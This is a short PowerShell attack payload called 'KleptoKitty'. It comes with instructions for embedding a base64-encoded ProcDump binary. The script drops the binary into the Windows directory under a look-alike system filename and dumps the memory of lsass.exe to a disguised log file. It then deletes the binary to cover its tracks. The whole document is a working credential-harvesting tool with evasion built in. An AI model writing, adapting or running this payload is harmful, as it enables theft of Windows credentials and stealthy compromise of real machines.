<#

     =^._.^=
    _(      )/  KleptoKitty

    How to build payload:

    1.	Get ProcDump from a Microsoft
    	https://docs.microsoft.com/en-us/sysinternals/downloads/procdump   

#>

# ProcDump - Base64 encoded
$BlobProcDump = "<add base64 string here>"
$PathProcDump = "$env:SystemRoot\spIwow64.exe"
$DumpFile = "$env:SystemRoot\nI-NL.log"

# Deploy ProcDump and run it
cd "$env:SystemRoot\System32"
[IO.File]::WriteAllBytes($PathProcDump, [Convert]::FromBase64String($BlobProcDump))
&$PathProcDump -accepteula -64 -ma lsass.exe $DumpFile

Remove-Item $PathProcDump
